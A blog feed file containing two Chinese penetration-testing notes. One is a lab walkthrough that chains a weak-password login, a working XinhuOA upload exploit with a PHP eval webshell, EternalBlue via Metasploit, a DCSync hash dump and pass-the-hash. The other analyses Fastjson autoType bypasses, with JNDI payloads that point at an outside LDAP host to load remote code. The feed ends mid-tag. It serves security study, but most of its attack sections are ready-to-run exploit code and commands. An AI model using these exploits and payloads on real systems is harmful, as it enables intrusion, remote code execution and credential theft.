<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>渗透 Test one</title>
      <link href="/posts/1837i0jy.html"/>
      <url>/posts/1837i0jy.html</url>
      
        <content type="html"><![CDATA[<h1>渗透 Test one</h1><p>炸了好几次，时间就是金钱啊家人们</p><h2 id="flag01">flag01</h2><p>先上fscan，结果如下</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240405004025355.png" alt="image-20240405004025355"></p><p>直接上工具梭</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240405004132547.png" alt="image-20240405004132547"></p><p>查看sudo可执行的命令，发现mysql可以免密使用</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo -l</span></span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240405004905520.png" alt="image-20240405004905520"></p><p>执行命令，拿下第一段flag</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240405005213997.png" alt="image-20240405005213997"></p><p>flag{60b53231-</p><h2 id="flag02">flag02</h2><p>查看ip，发现存在内网ip</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240405005257674.png" alt="image-20240405005257674"></p><p>传上fscan开扫，结果如下</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240405005455480.png" alt="image-20240405005455480"></p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">172.22.1.2</span>   DC域控</span><br><span class="line"><span class="number">172.22.1.21</span>  MS17-<span class="number">010</span>永恒之蓝</span><br><span class="line"><span class="number">172.22.1.18</span>  信呼OA系统</span><br></pre></td></tr></table></figure><p>先打OA，上frp，连上后先弱口令登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin/admin123</span><br></pre></td></tr></table></figure><p>然后是信呼OA的后台getshell漏洞，参考博客</p><p><a href="https://blog.csdn.net/solitudi/article/details/118675321">https://blog.csdn.net/solitudi/article/details/118675321</a></p><p>1.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;1&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="http://exp.py">exp.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line">url_pre = <span class="string">&#x27;http://url/&#x27;</span></span><br><span class="line">url1 = url_pre + <span class="string">&#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span></span><br><span class="line">url2 = url_pre + <span class="string">&#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span></span><br><span class="line">url3 = url_pre + <span class="string">&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#x27;</span></span><br><span class="line"></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;rempass&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;jmpass&#x27;</span>: <span class="string">&#x27;false&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;device&#x27;</span>: <span class="string">&#x27;1625884034525&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ltype&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminuser&#x27;</span>: <span class="string">&#x27;dGVzdA::&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminpass&#x27;</span>: <span class="string">&#x27;YWJjMTIz&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;yanzm&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = session.post(url1, data=data1)</span><br><span class="line">r = session.post(url2, files=&#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;1.php&#x27;</span>, <span class="string">&#x27;r+&#x27;</span>)&#125;)</span><br><span class="line"></span><br><span class="line">filepath = <span class="built_in">str</span>(r.json()[<span class="string">&#x27;filepath&#x27;</span>])</span><br><span class="line">filepath = <span class="string">&quot;/&quot;</span> + filepath.split(<span class="string">&#x27;.uptemp&#x27;</span>)[<span class="number">0</span>] + <span class="string">&#x27;.php&#x27;</span></span><br><span class="line"><span class="built_in">id</span> = r.json()[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line"></span><br><span class="line">url3 = url_pre + <span class="string">f&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line">r = session.get(url3)</span><br><span class="line">r = session.get(url_pre + filepath + <span class="string">&quot;?1=system(&#x27;whoami&#x27;);&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim <span class="regexp">/etc/</span>proxychains4.conf</span><br></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 <span class="keyword">python</span> <span class="built_in">exp</span>.<span class="keyword">py</span></span><br></pre></td></tr></table></figure><p>蚁剑链接</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240405015859382.png" alt="image-20240405015859382"></p><p>2ce3-4813-87d4-</p><h2 id="flag03">flag03</h2><p>下面打永恒之蓝</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">proxychains msfconsole</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">show options </span><br><span class="line"><span class="built_in">set</span> rhosts 172.22.1.21</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240405020501207.png" alt="image-20240405020501207"></p><p>成功拿到shell。</p><p>接下来开始横向。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv</span><br></pre></td></tr></table></figure><p>导出hash</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">proxychains</span>] DLL <span class="keyword">init</span>: proxychains-ng <span class="number">4.16</span></span><br><span class="line">[<span class="meta">proxychains</span>] DLL <span class="keyword">init</span>: proxychains-ng <span class="number">4.16</span></span><br><span class="line">[<span class="meta">DC</span>] <span class="string">&#x27;xiaorang.lab&#x27;</span> will be the domain</span><br><span class="line">[<span class="meta">DC</span>] <span class="string">&#x27;DC01.xiaorang.lab&#x27;</span> will be the DC server</span><br><span class="line">[<span class="meta">DC</span>] Exporting domain <span class="string">&#x27;xiaorang.lab&#x27;</span></span><br><span class="line">[<span class="meta">rpc</span>] Service  : ldap</span><br><span class="line">[<span class="meta">rpc</span>] AuthnSvc : GSS_NEGOTIATE (<span class="number">9</span>)</span><br><span class="line"><span class="number">502</span>     krbtgt  fb812eea13a18b7fcdb8e6d67ddc205b        <span class="number">514</span></span><br><span class="line"><span class="number">1106</span>    Marcus  e07510a4284b3c97c8e7dee970918c5c        <span class="number">512</span></span><br><span class="line"><span class="number">1107</span>    Charles f6a9881cd5ae709abb4ac9ab87f24617        <span class="number">512</span></span><br><span class="line"><span class="number">1000</span>    DC01$   <span class="number">3</span>a54e96466a11502d4a8bd7dd1746911        <span class="number">532480</span></span><br><span class="line"><span class="number">500</span>     Administrator   <span class="number">10</span>cf89a850fb1cdbe6bb432b859164c8        <span class="number">512</span></span><br><span class="line"><span class="number">1104</span>    XIAORANG-OA01$  <span class="number">167e24</span>e8afb0c835f9d455cd19369556        <span class="number">4096</span></span><br><span class="line"><span class="number">1108</span>    XIAORANG-WIN7$  <span class="number">02f</span>74ed628cda09bde9a31940ffc05aa        <span class="number">4096</span></span><br></pre></td></tr></table></figure><p>hash传递，拿到flag。</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains crackmapexec smb <span class="number">172.22</span>.<span class="number">1.2</span> -u administrator -H<span class="number">10</span>cf<span class="number">89</span>a<span class="number">850</span>fb<span class="number">1</span>cdbe<span class="number">6</span>bb<span class="number">432</span>b<span class="number">859164</span><span class="keyword">c</span><span class="number">8</span> -d xiaorang.lab -<span class="keyword">x</span> <span class="string">&quot;type Users\Administrator\flag\flag03.txt&quot;</span></span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240405020653891.png" alt="image-20240405020653891"></p><p>flag{60b53231-2ce3-4813-87d4-</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fastjson 1.2.25&amp;42&amp;43&amp;45&amp;47</title>
      <link href="/posts/1uyhgiuj.html"/>
      <url>/posts/1uyhgiuj.html</url>
      
        <content type="html"><![CDATA[<h1>Fastjson 1.2.25&amp;42&amp;43&amp;45&amp;47</h1><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326102224599.png" alt="image-20240326102224599"></p><p>在版本 1.2.25 中，官方对之前的反序列化漏洞进行了修复，引入了 checkAutoType 安全机制，默认情况下 autoTypeSupport 关闭，不能直接反序列化任意类，而打开 AutoType 之后，是基于内置黑名单来实现安全的，fastjson 也提供了添加黑名单的接口。</p><p><strong>com.alibaba.fastjson.parser.ParserConfig</strong></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240325194400099.png" alt="image-20240325194400099"></p><p>作者在这里增加了autoTypeSupport和黑名单</p><p>其中黑名单 denyList 包括：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">bsh</span><br><span class="line">com.mchange</span><br><span class="line">com.sun.</span><br><span class="line">java.lang.Thread</span><br><span class="line">java.net.Socket</span><br><span class="line">java.rmi</span><br><span class="line">javax.xml</span><br><span class="line">org.apache.bcel</span><br><span class="line">org.apache.commons.beanutils</span><br><span class="line">org.apache.commons.collections.Transformer</span><br><span class="line">org.apache.commons.collections.functors</span><br><span class="line">org.apache.commons.collections4.comparators</span><br><span class="line">org.apache.commons.fileupload</span><br><span class="line">org.apache.myfaces.context.servlet</span><br><span class="line">org.apache.tomcat</span><br><span class="line">org.apache.wicket.util</span><br><span class="line">org.codehaus.groovy.runtime</span><br><span class="line">org.hibernate</span><br><span class="line">org.jboss</span><br><span class="line">org.mozilla.javascript</span><br><span class="line">org.python.core</span><br><span class="line">org.springframework</span><br></pre></td></tr></table></figure><p>添加反序列化白名单有3种方法：</p><ol><li>使用代码进行添加：<code>ParserConfig.getGlobalInstance().addAccept(“org.chu0.fastjson.,org.javaweb.”)</code></li><li>加上JVM启动参数：<code>-Dfastjson.parser.autoTypeAccept=org.chu0.fastjson.</code></li><li>在fastjson.properties中添加：<code>fastjson.parser.autoTypeAccept=org.chu0.fastjson.</code></li></ol><p>注意下面这个部分，这是本次更新主要更新的waf部分DefaultJSONParser.class#parseObject</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240325195533854.png" alt="image-20240325195533854"></p><p>我们跟进checkAutoType进行分析</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240325195811642.png" alt="image-20240325195811642"></p><p>这里由于我并没有开启autoTypeSupport，所以两层false直接跳过了黑白名单的检查</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240325200027354.png" alt="image-20240325200027354"></p><p>如果在黑名单部分的话，下面就会直接抛出异常，结束程序，结果如下</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240325200424189.png" alt="image-20240325200424189"></p><p>测试代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        String payload=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://localhost:9999/a\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span> ;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> JSONObject.parseObject(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span><span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://localhost:9999/a&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="必须开启AutoType-绕过">必须开启AutoType 绕过</h2><h3 id="fj-1-2-42">fj &lt; 1.2.42</h3><p>主动开启AutoTypeSupport</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>测试代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo1225</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        String payload=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://110.41.17.183:5555/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span> ;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        System.out.println(payload);</span><br><span class="line">        JSON.parseObject(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://localhost:9999/a&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>运行结果，由于这里没有配置服务端，所以没有任何反应</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240325202131037.png" alt="image-20240325202131037"></p><p>可以发现在这里com.sun.rowset.JdbcRowSetImpl前面增加了一个字母L,后面增加了一个分号，为什么这样就可以绕过了呢，且看下面分析</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240325202454639.png" alt="image-20240325202454639"></p><p>由于在前面增加了一个字母L，所以就可以绕过黑白名单的检测，进入到上面的TypeUtils.loadClass方法，我们可以进入继续分析</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240325203738111.png" alt="image-20240325203738111"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240325203824483.png" alt="image-20240325203824483"></p><p>可以看到这里对前面的L和后面的;都进行了处理，最后再次调用loadClass方法，是可以绕过的</p><h3 id="1-2-42-fj-1-2-43">1.2.42&lt;=fj&lt;1.2.43</h3><p>42之后的版本在检查checkAutoType之前对类名进行了截取前后各一个字符的操作，详见下面对比</p><p>此图为1.2.47版本，下面那一串数字是因为42版本后对于类名的表示都变成了对应的hash值</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326105123966.png" alt="image-20240326105123966"></p><p>此图为1.2.25</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326105231000.png" alt="image-20240326105231000"></p><p>我们可以明显发现在if (this.autoTypeSupport || expectClass != null) {}之前增加了部分代码，具体效果就是截取类名1到length-1的部分（去掉前后各一个字符），应对方法也十分简单，双写即可，payload如下</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;rmi://127.0.0.1/hacked&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>测试代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo1242</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        String payload=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://110.41.17.183:5555/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span> ;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        System.out.println(payload);</span><br><span class="line">        JSON.parseObject(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="fj-1-2-43">fj &lt; 1.2.43</h3><p>我们继续运行之前的payload，发现直接报错了，下面将会进行断点分析</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326111056498.png" alt="image-20240326111056498"></p><p>发现异常部分如下</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326111141831.png" alt="image-20240326111141831"></p><p>这段其实就是对L开头;结尾的类名进行了waf，所以后面的绕过就不能用L&amp;;了，跟踪下面的TypeUtils.loadClass进行分析</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326111523730.png" alt="image-20240326111523730"></p><p>对于类名的绕过不只是L&amp;;，[也可以被利用进行绕过，衍生出如下payload</p><p>测试代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo1243</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        String payload=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[,&#123;\&quot;dataSourceName\&quot;:\&quot;ldap://110.41.17.183:5555/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span> ;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        System.out.println(payload);</span><br><span class="line">        JSON.parseObject(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">[</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span><span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://110.41.17.183:5555/Exploit&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="fj-1-4-45">fj &lt; 1.4.45</h3><p>需要搭配mybatis3使用</p><p><strong>mybatis3 &lt;=3.4.6</strong></p><p>具体入口如下</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326115759125.png" alt="image-20240326115759125"></p><p>fj在实例化的时候会调用对应成员变量的getter或者setter方法，所以就会调用此处的lookup方法，进而触发JNDI注入，对于jndi还不熟悉的师傅建议从1.2.24开始学起，jndi可以说是贯穿很多版本的fj</p><p>测试代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo1245</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        String payload=<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;, \&quot;properties\&quot;:&#123;\&quot;data_source\&quot;:\&quot;ldap://110.41.17.183:5555/Exploit\&quot;&#125;&#125;&quot;</span> ;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        System.out.println(payload);</span><br><span class="line">        JSON.parseObject(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload如下</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;data_source&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://110.41.17.183:5555/Exploit&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="fj-1-2-47通杀"><strong>fj &lt;= 1.2.47</strong>通杀</h2><p><strong>fj &lt;= 1.2.47</strong>通杀</p><p>所谓通杀，就是不管是否开启AutoType都可以执行</p><p><strong>@type是Class类时会加载val对应的类并写入缓存</strong></p><ul><li>关闭了autoTypeSupport肯定进不去白名单查找，又由于Mapping为空就进入findClass</li><li>开启了autoTypeSupport在白名单也找不到Class类（默认白名单为空），也会最终进入findClass</li></ul><h3 id="开启AutoType分析">开启AutoType分析</h3><p>进入checkAutoType，由于clazz为空，所以会进入下面的第一个判断</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326205306719.png" alt="image-20240326205306719"></p><p>第一个判断并没有返回clazz，所以会进入第二个判断，我们断点跟进</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326205549027.png" alt="image-20240326205549027"></p><p>IdentifyHashMap存了很多基础类，匹配到直接返回，这里就是匹配到了&quot;java.lang.Class&quot;</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326205709132.png" alt="image-20240326205709132"></p><p>返回上层函数，就可以发现这里将clazz return了，返回DefaultJSONParser#parseObject方法，并进入了deserializer.deserialze方法</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326205817596.png" alt="image-20240326205817596"></p><p>我们继续断点跟进</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326213137003.png" alt="image-20240326213137003"></p><p>此处对objVal进行了赋值，继续跟进</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326213326910.png" alt="image-20240326213326910"></p><p>在266行对strVal进行了赋值操作，最后是重头戏</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326213405415.png" alt="image-20240326213405415"></p><p>由于此处的clazz并不为空，所以执行了下面的loadClass，对于strVal类进行了加载，继续跟进</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240326213655825.png" 